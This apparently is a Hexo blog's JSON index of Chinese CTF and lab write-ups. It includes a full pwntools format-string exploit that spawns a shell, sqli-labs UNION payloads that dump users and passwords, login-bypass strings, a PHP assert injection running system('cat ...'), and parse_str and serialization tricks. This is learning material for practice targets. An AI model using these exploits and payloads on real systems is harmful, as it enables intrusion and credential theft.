{"meta":{"title":"summerN's blog","subtitle":"","description":"","author":"summerN","url":"http://yoursite.com","root":"/"},"pages":[{"title":"about","date":"2019-12-16T10:41:24.000Z","updated":"2019-12-16T10:41:25.005Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-12-16T10:41:58.000Z","updated":"2019-12-16T10:41:58.555Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-12-16T10:41:44.000Z","updated":"2019-12-16T10:41:44.254Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"friends","date":"2019-12-16T10:41:52.000Z","updated":"2019-12-16T10:41:52.351Z","comments":true,"path":"friends/index.html","permalink":"http://yoursite.com/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"SWPUCTF","slug":"SWPUCTF","date":"2019-12-16T12:41:58.763Z","updated":"2019-12-09T02:03:04.648Z","comments":true,"path":"2019/12/16/SWPUCTF/","link":"","permalink":"http://yoursite.com/2019/12/16/SWPUCTF/","excerpt":"","text":"pwn2先check 还可以、 这个题涉及了bss段的格式化字符串把漏洞，需要通过改写栈上的地址来挟持返回地址，之后再改写我们想输入的字符串（bin/sh） 难度在于 1.查找libc版本 2.改写链的地址 3.对于改写的话需要一个一个字节的去改写，具体看脚本 login.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!/usr/bin/python2#encoding:utf-8#__author__='pumpkin9@DL&amp;S'from pwn import *import sys# context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')file_name = './login'libc_name = '/lib/i386-linux-gnu/libc.so.6'ip = '108.160.139.79'port = '9090'# context.arch = 'amd64'# context.log_level='debug'context.terminal=['tmux','split','-h']lib = ELF(libc_name)elf = ELF(file_name)p = process(file_name)# p = remote(ip,int(port))li = lambda name,x : log.info(name+':0x%x'%x)ls = lambda name,x : log.success(name+':0x%x'%x)key = \"wllmmllw\"p.sendlineafter(\"Please input your name: \\n\",\"pumpkin9\")payload = \"%15$p\"p.sendlineafter(\"password: \\n\",payload)p.recvuntil(\"This is the wrong password: \")libc = int(p.recvuntil(\"\\n\",True),16)-241-lib.symbols['__libc_start_main']#获取libc基地址ls(\"libc addr\",libc)onegg = libc + lib.symbols['system']#获取system地址ls(\"one_gadget\",onegg)binsh = libc + lib.search('/bin/sh').next()#获取bin/sh地址ls(\"sh addr\",binsh)p.recvuntil(\"Try again!\\n\")p.sendline(\"%6$p\")p.recvuntil(\"This is the wrong password: \")stack = int(p.recvuntil(\"\\n\",True),16)#获取的是ebp中的内容target = stack -12 #这个的计算结果为返回地址ls(\"stack addr\",stack)ls(\"target addr\",target)gdb.attach(p)num = target&amp;0xff#进行按位与运算目的是除去多余的位数，在这里是保留后12位data1 = 0x100#onegg&amp;0xffdata2 = (onegg&amp;0xffff)&gt;&gt;8 #右移位运算获取第二个字符位data3 = (onegg&amp;0xffffff)&gt;&gt;16#获取第三个字符位data4 = onegg&gt;&gt;24#获取第四个字符位li(\"sys1\",data1)li(\"sys2\",data2)li(\"sys3\",data3)li(\"sys3\",data4)data5 = binsh&amp;0xff#同data1-4的作用data6 = ((binsh&amp;0xffff)&gt;&gt;8)data7 = ((binsh&amp;0xffffff)&gt;&gt;16)data8 = binsh&gt;&gt;24li(\"sh1\",data5)li(\"sh2\",data6)li(\"sh3\",data7)li(\"sh4\",data8)p.sendlineafter(\"Try again!\\n\",\"%\"+str(num)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data1)+\"c%10$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+1)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data2)+\"c%10$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+2)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data3)+\"c%10$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+3)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data4)+\"c%10$hhn\")gdb.attach(p)p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+8)+\"c%6$hhn\")#参数放到返回地址后面即可p.sendlineafter(\"Try again!\\n\",\"%\"+str(data5)+\"c%10$hhn\")#但是为什么要间隔四个字节呢p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+9)+\"c%6$hhn\")#对于32位的程序根据libc中的system一般都要这样p.sendlineafter(\"Try again!\\n\",\"%\"+str(data6)+\"c%10$hhn\")#先记住p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+10)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data7)+\"c%10$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(num+11)+\"c%6$hhn\")p.sendlineafter(\"Try again!\\n\",\"%\"+str(data8)+\"c%10$hhn\")#raw_input('#')p.sendlineafter(\"Try again!\\n\",key)p.interactive()","categories":[],"tags":[]},{"title":"web狗之xml实体攻击","slug":"web狗之xml实体攻击","date":"2019-12-16T02:37:33.979Z","updated":"2019-04-05T13:17:59.652Z","comments":true,"path":"2019/12/16/web狗之xml实体攻击/","link":"","permalink":"http://yoursite.com/2019/12/16/web%E7%8B%97%E4%B9%8Bxml%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB/","excerpt":"web狗之xml实体攻击浅学我们先来了解一下xml 1234567891011&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;note&gt;&lt;to&gt;chybeta&lt;&#x2F;to&gt;&lt;from&gt;ph0en1x&lt;&#x2F;from&gt;&lt;&#x2F;note&gt;在上面代码中的第一行，定义XML的版本与编码。在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，&lt;note&gt;是整个文档的根元素。嵌套在note标签中的&lt;to&gt;和&lt;from&gt;则是根的子元素。同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。","text":"web狗之xml实体攻击浅学我们先来了解一下xml 1234567891011&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;note&gt;&lt;to&gt;chybeta&lt;&#x2F;to&gt;&lt;from&gt;ph0en1x&lt;&#x2F;from&gt;&lt;&#x2F;note&gt;在上面代码中的第一行，定义XML的版本与编码。在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，&lt;note&gt;是整个文档的根元素。嵌套在note标签中的&lt;to&gt;和&lt;from&gt;则是根的子元素。同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。 我们再了解一下实体： 123所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。实体类型：XML实体分为四种：字符实体，命名实体，外部实体，参数实体。 文档类型定义：DTD 12345简单的说，DTD的作用是定义XML文档的合法构建模块。如前所述，实体也是构建模块之一。因此可以利用DTD来内部或外部引入实体。其基本格式：&lt;!DOCTYPE 根元素名 [ 元素描述 ]&gt; 内部引入格式： 将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。例如： 12345678910&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY chybeta &quot;Hello World!&quot;&gt;]&gt;&lt;xxe&gt;&amp;chybeta;&lt;&#x2F;xxe&gt; 访问该XML文档，&amp;chybeta;会被解析为Hello World!并输出。 外部引入基本格式： 12345&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 通过引用定义在外部的DTD中的实体，我们称之为外部实体。 之后呢，我们通过jarvis上的一道web题来尝试一下：http://web.jarvisoj.com:9882/我们先进行一下抓包之后呢我们发现第一个红箭头的位置，使用的是json方式传入我们改为xml，之后编写代码进行传入go后我们得到flag小白，还请多多关照","categories":[],"tags":[]},{"title":"urldecode二次编码绕过","slug":"urldecode二次编码绕过","date":"2019-12-16T02:37:33.963Z","updated":"2019-03-12T11:18:59.768Z","comments":true,"path":"2019/12/16/urldecode二次编码绕过/","link":"","permalink":"http://yoursite.com/2019/12/16/urldecode%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87/","excerpt":"","text":"代码审计日志三urldecode二次绕过题目： 123456789101112131415161718192021&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;echo(&quot;not allowed!&quot;);exit();&#125;$_GET[id] &#x3D; urldecode($_GET[id]);if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)&#123;echo &quot;Access granted!&quot;;echo &quot;flag&quot;;&#125;?&gt; 经过审计：由 1$_GET[id] &#x3D; urldecode($_GET[id]); 可知，我们需要将hackerDJ进行urldecode编码后get上传我们上传后得到：not allowed!再看url发现我们get传入的url编码值被浏览器自动解码因此我们需要再一次进行编码上传后得到flag","categories":[],"tags":[]},{"title":"sql语句之where字句学习笔记","slug":"sql语句之where字句学习笔记","date":"2019-12-16T02:37:33.948Z","updated":"2019-03-16T07:27:22.813Z","comments":true,"path":"2019/12/16/sql语句之where字句学习笔记/","link":"","permalink":"http://yoursite.com/2019/12/16/sql%E8%AF%AD%E5%8F%A5%E4%B9%8Bwhere%E5%AD%97%E5%8F%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"sql语句之where字句学习笔记我们先说一下wherer字句作用： 限制表中的数据返回 符合where后面的条件的数据就会被选中，不符合where条件的语句会被过滤掉1.两个极限条件 where 1 = 1 where 1 = 2自我感觉一般用来完善sql语法补齐引号2.字符串条件的表达就像我们爆表的那个常用语句","text":"sql语句之where字句学习笔记我们先说一下wherer字句作用： 限制表中的数据返回 符合where后面的条件的数据就会被选中，不符合where条件的语句会被过滤掉1.两个极限条件 where 1 = 1 where 1 = 2自我感觉一般用来完善sql语法补齐引号2.字符串条件的表达就像我们爆表的那个常用语句 ?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()先说明一下table_schema 的意思是数据库名database()是返回当前的数据库名因此此处的where意思是指：查询的范围被限定在了此数据库中，即起到约束作用3.模糊查询格式为：like（像）+ 通配符 （1） “%”为通配符，代表0 - n个任意字符 （1）“-”代表一个任意字符例如： SELECT * FROM news WHERE keyword like &apos;%$keyword%&apos;意思就是此查询news中所有的含有我们所输入的$keyword的字符串（暂且先这样说） where name like ‘_$keyword%’这个就是查询中间为我们所输入的字符串@当我们要查询例如’$keyword_’时，我们要进行转义即使用\\ where name like &apos;$keyword\\_%&apos;4.还有使用一些条件链接符号进行限制条件","categories":[],"tags":[]},{"title":"sqli-lab 学习记录less2","slug":"sqli-lab 学习记录less2","date":"2019-12-16T02:37:33.932Z","updated":"2019-03-16T03:30:33.130Z","comments":true,"path":"2019/12/16/sqli-lab 学习记录less2/","link":"","permalink":"http://yoursite.com/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95less2/","excerpt":"title:sqli-lab 学习记录less2date:2019-3-16tags:sqli-lab sqli-lab 学习记录less2less21.我们先来判断这次的sql注入类型我们输入 ?id=1 ?id=1&apos;发现第一个语句返回正确但是第二个却有了报错我们因此可以判断这次的sql注入类型为数字类型","text":"title:sqli-lab 学习记录less2date:2019-3-16tags:sqli-lab sqli-lab 学习记录less2less21.我们先来判断这次的sql注入类型我们输入 ?id=1 ?id=1&apos;发现第一个语句返回正确但是第二个却有了报错我们因此可以判断这次的sql注入类型为数字类型 2.之后和less1一样我们进行暴表的名字（暴表）我们输入 ?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()我们由此得到3.我们之后开始爆列喽输入 ?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;我们可以得到4.最后我们来获得我们要得到的东西输入代码 ?id=0 union select 1,group_concat(id,username,password),3 from users就得到了我们要得到的东西另外我们附加关于where的知识 table_schema是数据库名database()函数会返回当前的数据库名)where就是约束条件这个 where后面 就是为了约束一下 我要查询的数据库 而不是去 看其他数据库里的东西我要看的 东西 就是 当前数据库database里的 不是其他的数据里的比如 有两个数据库 数据库1 数据库2 当前的数据库database是数据库1 你可以 where table_schema=database() 或者是where table_schema=’数据库1’","categories":[],"tags":[]},{"title":"sql注注入类型解释","slug":"sql注注入类型解释","date":"2019-12-16T02:37:33.932Z","updated":"2019-03-16T06:45:49.408Z","comments":true,"path":"2019/12/16/sql注注入类型解释/","link":"","permalink":"http://yoursite.com/2019/12/16/sql%E6%B3%A8%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E8%A7%A3%E9%87%8A/","excerpt":"title: sql注注入类型解释date: 2019-03-16 09:53:41tags: sql注入类型简单记录1.sql注入流程（1）判断注入点（2）判断注入类型（3）判断数据库类型（3）获得数据库数据，提权","text":"title: sql注注入类型解释date: 2019-03-16 09:53:41tags: sql注入类型简单记录1.sql注入流程（1）判断注入点（2）判断注入类型（3）判断数据库类型（3）获得数据库数据，提权 一、判断注入点 所有的输入只要和数据库进行交互的，都有可能触发SQL注入一般有三类Get参数触发SQL注入POST参数触发SQL注入Cookie触发SQL注入 一般我们输入&apos;来判断 是否存在注入点 如果页面返回错误，则存在 Sql 注入 原因是： 原因是无论字符型还是整型都会因为单引号个数不匹配而报错。二、判断注入类型我们来了解一下：有以下几种注入类型：（1）数字型注入点（2）字符型注入点（3）搜索型注入点（4）内嵌式sql注入（5）终止试sql注入之后我们进行解释：1.数字型注入点测试方法： http://host/test.php?id=100 and 1=1 返回成功 http://host/test.php?id=100 and 1=2 返回失败为什么呢 假设我们网站的SQL查询的语句是这样的SELECT * FROM news WHERE id=$id那么这个$id 即为用户提交的 当我们输入的是100 and 1=1语句就变成了这样SELECT * FROM news WHERE id=100 and 1=1对于and 这个SQL语句and左边是返回成功的，因为我们是在有这个id的情况下后面加上我们的注入语句，如果这个id不存在，那就没法测试了 而在and右边，1=1也是恒成立的，所以整个语句返回的是成功 当然，如果后面改成了1=2的话，因为1=2是不成立的，and语句的判断逻辑是只要有一个不成立，就返回失败，所以1=2最后会返回的是失败 因此我们可以这样进行判断2.字符型注入点测试方法： http://host/test.php?name=man&#39; and ‘1’=’1 返回成功 http://host/test.php?name=man&#39; and ‘1’=’2返回失败 这里就使上面的数字型变为了字符型 原因如下： 还是假设我们网站的SQL语句是这样的 SELECT * FROM news WHERE name=&apos;$name&apos; 当我们构造输入为下面这个的时候 man&apos; and &apos;1&apos;=&apos;1 语句就变成了 SELECT * FROM news WHERE name=&apos;man&apos; and &apos;1&apos;=&apos;1&apos;发现什么了没？这个SQL已经闭合了 还是一样的，这里and的左边是一定成立的，而and右边也是一样的成立，所以and逻辑之后，整个语句返回成功 同理可知如果后面是1&apos;=&apos;2就会返回失败，当然，这里不一定非要是1或者2，因为是字符型，所以我们可以输入任何字符比如这样 http://host/test.php?name=man&apos; and &apos;a&apos;=&apos;a 返回成功 http://host/test.php?name=man&apos; and &apos;a&apos;=&apos;b返回失败 3.搜索式sql注入 测试方法 http://host//test.php?keyword=python%&#39; and 1=1 and ‘%’=’ http://host//test.php?keyword=python%&#39; and 1=2 and ‘%’=’ 假设我们的SQL查询语句是这样的 SELECT * FROM news WHERE keyword like &apos;%$keyword%&apos; 这里的$keyword是用户的输入 当我们输入以下语句的时候 pt%&apos; and 1=1 and &apos;%&apos;=&apos; 最终我们得到的语句是这样的 SELECT * FROM news WHERE keyword like &apos;%pt%&apos; and 1=1 and &apos;%&apos;=&apos;%&apos; 这个语句又一次的闭合了这里我们再分析以下，因为是and逻辑，只要有一个错误，就返回错误 我们可以把这个语句分为三段 SELECT * FROM news WHERE keyword like &apos;%python%&apos; and 1=1 and &apos;%&apos;=&apos;%&apos; 第一行的语句肯定是成功（再强调一遍，我们要在存在的查询上构造SQL注入） 第二句也是，第三句也是，因为自己肯定等于自己啊 但是如果我们把第二句换成1=2，那么这个语句肯定就会返回失败了，就是这个原理4.内嵌式sql注入内联注入是指查询注入SQL代码后，原来的查询仍然全部执行 假设我们的网站SQL查询语句是这样的 SELECT * FROM admin WHER username=’$name’ AND password =’$passwd’ 这一看就是个登录页面的代码 假如我们构造如下语句提交到登录框中的username &apos; or &apos;&apos;=&apos; 或者提交到password框里面，这两种提交方法是不一样的，我们下面就来分析一下这两个提交方法 提交到username我们的语句就会成为这样 SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;fuzz是我们随便输入的字符串 而提交到password则会是这样的 SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos; or &apos;&apos;=&apos;&apos;注: 在SQL语句中，AND的优先级是大于OR的 先计算AND，然后计算OR，所以这里我们的语句会被OR分为两段SQL语句 这是username框的 SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;或者password框的是这样 SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos; or &apos;&apos;=&apos;&apos;我们首先用第一个来分析 首先计算AND之后 SELECT * FROM admin WHER username=&apos;&apos;返回失败 or &apos;&apos;=&apos;&apos; AND password =&apos;fuzz&apos;返回失败数据库是不会存在username为NULL的字段的，所以第一句返回的是失败，第三句中，因为password是我们随便输入的，99.99%是不会存在这个密码的，于是AND之后，我们的第三句也是失败的，所以整个语句返回失败的 但是我们的password情况就不一样了 SELECT * FROM admin WHER username=&apos;fuzz&apos; AND password =&apos;&apos; or &apos;&apos;=&apos;&apos;这里我们第一句是返回失败的，但是我们的第二句’’=’’是返回成功的，OR逻辑是有一个是成功就返回成功，于是我们的整个语句就会返回成功 返回成功之后我们就会绕过登录表单直接登录系统了5.终止式sql注入终止式SQL语句注入是指攻击者在注入SQL代码时，通过注释剩下的查询来成功结束该语句 于是被注释的查询不会被执行，我们还是拿上面那个例子举例 我们上面已经知道，在username框内填入 &apos; or &apos;&apos;=&apos; 程序是不会返回成功的，我们就没有办法在username做文章了吗？错了，我们还有终止式 还是上面那个SQL查询语句 SELECT * FROM admin WHER username=’$name’ AND password =’$passwd’ 这里我们构造如下username输入 &apos; or &apos;&apos;=&apos;&apos; --之后我们就可以得到如下的查询语句 SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; --&apos; AND password =&apos;fuzz&apos;这里的fuzz是我们随便输入的，–是注释符 这样，我们的语句就可以分为三个部分了 SELECT * FROM admin WHER username=&apos;&apos; or &apos;&apos;=&apos;&apos; 返回成功 --&apos; AND password =&apos;fuzz&apos;第一句肯定是返回失败的，但是我们第二句会返回成功 后面已经被我们注释掉了，是不会执行的，所以我们还是可以通过在username做这个手脚来绕过登录 下面是我们常见的一些终止方式终止字符串： – ， #， %23， %00， /*终止方法： – , ‘– , ‘)– , ) – , ‘)) –, ))–","categories":[],"tags":[]},{"title":"sqli-lab 学习记录 less3-less4","slug":"sqli-lab 学习记录 less3-less4","date":"2019-12-16T02:37:33.917Z","updated":"2019-03-19T12:26:10.716Z","comments":true,"path":"2019/12/16/sqli-lab 学习记录 less3-less4/","link":"","permalink":"http://yoursite.com/2019/12/16/sqli-lab%20%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%20less3-less4/","excerpt":"sqli-lab 学习记录 less3-less4less3:进入界面我们先进行判断注入的类型我们输入 ?id=1有正常回显之后我们在输入 ?id=1&apos;","text":"sqli-lab 学习记录 less3-less4less3:进入界面我们先进行判断注入的类型我们输入 ?id=1有正常回显之后我们在输入 ?id=1&apos; 发现出现了：根据后面的报错我们可以大致的判断此sql语句是这样的： SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1&quot;之后呢，我们来验证我们的判断我们输入 ?id=1&apos;) %23得到正常回显因此我们就确定了注入类型之后的步骤就和我们之前做less1与2一样了这里就不过多解释了 less4我们还是一样判断注入类型(这个类型与less3相似，但是爆出错误却很难)我刚开始输入了 ?id=1 ?id=1&apos; ?id=1 and 1=2均有回响弄得我一脸懵逼之后尝试使用 ?id=1&quot;终于爆出了错误从错误中我们大致可以判断应该是类似于（“ $id ”）我们可以构造 ?id=1&quot;) %23得到正常回显之后我们的步骤和之前一样就可以了 萌新文章，还请大佬们指导邮箱：497710073@qq.com","categories":[],"tags":[]},{"title":"sqli-lab less1","slug":"sqli-lab less1","date":"2019-12-16T02:37:33.901Z","updated":"2019-03-14T12:52:15.039Z","comments":true,"path":"2019/12/16/sqli-lab less1/","link":"","permalink":"http://yoursite.com/2019/12/16/sqli-lab%20less1/","excerpt":"","text":"sqli-lab 学习记录Less 11，我们先要爆出他的字段数，即列的数目插入知识：information_schema数据库是MySQL系统自带的数据库，它提供了数据库元数据的访问方式。感觉information_schema就像是MySQL实例的一个百科全书，记录了数据库当中大部分我们需要了结的信息，比如字符集，权限相关，数据库实体对象信息，外检约束，分区，压缩表，表信息，索引信息，参数，优化，锁和事物等等。数据库拥有一个名为tables的数据表，该表包含两个字段table_name和table_schema,分别记录DBMS中的存储的表名和表名所在的数据库。 ’ or 1=1 –+ （–后要加空格才能注释，但是在网址栏输入时最后加空格解析时会被去掉，所以用+，当然用%20也行）’ or 1=1 # （火狐下在url栏用#注释会报错，改成url编码%23即可）我们使用如下代码 123?id&#x3D;1&#39; order by 1 %23?id&#x3D;1&#39; order by 2 %23?id&#x3D;1&#39; order by 3 %23 当我们进行到order by 4 %23时，我们发现报错，所以我们判断有三列对了，要判断注入点输入 1?id&#x3D;1&#39; 会报错显示所以差不多我们输入的就放在了这对引号内ok2.之后我们进行爆表 1?id&#x3D;0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database() %23 得到了我们判断用户名在users中之后爆列喽附加一些资料) 1?id&#x3D;0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;&#39;users&#39; %23 得到：之后我们再得到我们需要的内容 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 1,group_concat(id,username,password),3 from users %23 最后我们就得到了我们想要的：累死了，，，加油吧","categories":[],"tags":[]},{"title":"jarvis OJ web babyphp","slug":"jarvis OJ web babyphp","date":"2019-12-16T02:37:33.885Z","updated":"2019-04-02T12:42:20.894Z","comments":true,"path":"2019/12/16/jarvis OJ web babyphp/","link":"","permalink":"http://yoursite.com/2019/12/16/jarvis%20OJ%20web%20babyphp/","excerpt":"babyphp考完二级后我又要回归web狗了今天做到一道web题上题：http://web.jarvisoj.com:32798/ 进入后：发现应该有git泄露因此我们使用githack进行获得源码","text":"babyphp考完二级后我又要回归web狗了今天做到一道web题上题：http://web.jarvisoj.com:32798/ 进入后：发现应该有git泄露因此我们使用githack进行获得源码 打开cmd 输入：python2 GitHack.py http://web.jarvisoj.com:32798/.git/ #这里的python2是我设置的用于区分python3 即这个脚本要使用python2之后我们得到源码： 当然如果我们直接在打开flag.php的话没用的，因为emmm标志被注释掉了)我们重点来看这里：assert（）函数这个我也不算太懂，但是只要是这一句话如果assertion是字符串，那么此字符串会被当做php代码执行因此我们就可以进行php注入（我的第一次php注入）我们在url后面输入 ?page=&apos;. system(&quot;cat templates/flag.php&quot;).&apos;这个代码的意思是打开flag.php 所在的templates文件中的此文件为什么知道他在那里，因为有： 输入payload后我们查看源代码得到flag为什么要查看源码才能看到了，因为标志被注释了呀（源代码的那部分是绿色的）","categories":[],"tags":[]},{"title":"python将时间戳转化为时间","slug":"python将时间戳转化为时间","date":"2019-12-16T02:37:33.885Z","updated":"2019-02-14T15:02:08.780Z","comments":true,"path":"2019/12/16/python将时间戳转化为时间/","link":"","permalink":"http://yoursite.com/2019/12/16/python%E5%B0%86%E6%97%B6%E9%97%B4%E6%88%B3%E8%BD%AC%E5%8C%96%E4%B8%BA%E6%97%B6%E9%97%B4/","excerpt":"","text":"title:第一篇博客：python时间转换（将时间戳转化为时间）date: 2019-02-014 22:37:58tags: python的os.path模块中有着这样的一个函数 123os.path.getatime() #获得文件的最近访问时间os.path.getctime() #获得文件的创建时间os.path.getmtime() #获得文件的修改时间 我们就以第一个函数为例os.path.getatime()1.首先使用 1time.localtime() #将其转换为localtime的格式 2.将转化过来的时间进行格式化，使用 1time.strftime(&quot;%d:%b:%Y:%H:%M:%S&quot;,temp) #temp为转化过来的localtime格式时间 3.最后输出就行了完整的过程如下所示：` 1234567import osimport timetemp &#x3D; time.localtime(os.path.getatime(&quot;python.exe&quot;))#获取python.exe的最近访问时间，并将其localtime化temp1 &#x3D; time.strftime(&quot;(&quot;%d:%b:%Y:%H:%M:%S&quot;,temp)#将temp格式化print(temp1) （这是我第一次写博客，有啥不好的，大佬指教）邮箱：497710073@qq.com","categories":[],"tags":[]},{"title":"issctf     web1","slug":"issctf     web1","date":"2019-12-16T02:37:33.854Z","updated":"2019-05-09T11:09:37.593Z","comments":true,"path":"2019/12/16/issctf     web1/","link":"","permalink":"http://yoursite.com/2019/12/16/issctf%20%20%20%20%20web1/","excerpt":"标题issctf 中最简单的一个web题（耗费了我一个小时。。。。）题目涉及知识点：1.php 中的几个函数（等会列举）2.php parse_str引起的变量覆盖漏洞","text":"标题issctf 中最简单的一个web题（耗费了我一个小时。。。。）题目涉及知识点：1.php 中的几个函数（等会列举）2.php parse_str引起的变量覆盖漏洞 一、我们要了解的php函数即方法$SERVER[‘REQUEST_URI’]parse_urlparse_str二、由parse_str引起的变量覆盖漏洞parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。ok三、接下来打开题目&lt;?phperror_reporting(0);include(“flag.php”); $hashed_key = ‘ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a’; $parsed = parse_url($SERVER[‘REQUEST_URI’]);if(isset($parsed[“query”])){ $query = $parsed[“query”]; $parsed_query = parse_str($query); if($parsed_query!=NULL){ $action = $parsed_query[‘action’]; } if($action===”auth”){ $key = $_GET[“key”]; $hashed_input = hash(‘sha256’, $key); if($hashed_input!==$hashed_key){ die(““); } echo $flag; }}else{ show_source(__FILE);}?&gt; 我们只需构造一个get传入是action=auth且将hashed_key变量进行覆盖，传入你想传入的经过sha256后的值最后传入key即可样本?action=auth&amp;hashed_key=xxxxxxx&amp;key=xxx","categories":[],"tags":[]},{"title":"flag.php bugku  web","slug":"flag.php bugku  web","date":"2019-12-16T02:37:33.839Z","updated":"2019-03-08T11:25:46.123Z","comments":true,"path":"2019/12/16/flag.php bugku  web/","link":"","permalink":"http://yoursite.com/2019/12/16/flag.php%20bugku%20%20web/","excerpt":"","text":"bugku web flag.php打开题目网页首先尝试了一下简单的sql注入但是没用想了一会后，发现提示hint所以我们尝试一下使用get方法传入hint任意值即?hint=1传入后发现一页代码 1234567891011121314151617181920212223242526272829303132333435 &lt;?phperror_reporting(0);include_once(&quot;flag.php&quot;);$cookie &#x3D; $_COOKIE[&#39;ISecer&#39;];if(isset($_GET[&#39;hint&#39;]))&#123; show_source(__FILE__);&#125;elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;)&#123; echo &quot;$flag&quot;;&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;&lt;title&gt;Login&lt;&#x2F;title&gt;&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;br&gt;&lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt; &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt; &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt; &lt;&#x2F;form&gt;&lt;&#x2F;div&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php&#125;$KEY&#x3D;&#39;ISecer:www.isecer.com&#39;;?&gt; 之后我们查看开头的代码发现要将cookie指进行序列化后使与key值相等即可得到flag但是注意：下方的key值并不是我们需要的而我们需要的key值在程序中并没有赋值因此为NULL所以有 1234&lt;?php$KEY&#x3D;&quot;&quot;;print(serialize($KEY));?&gt; 因为我们并没有对$key进行赋值因此求序列化的程序如上所示之后我们可以使用火狐上的hackbar上传cookies即ISecer=s:0:””%3b因为；无法上传 ， 因此我们使用其的url码上传注意，上传的时候要在没有get hint的页面中进行否则无法显示flag 萌新 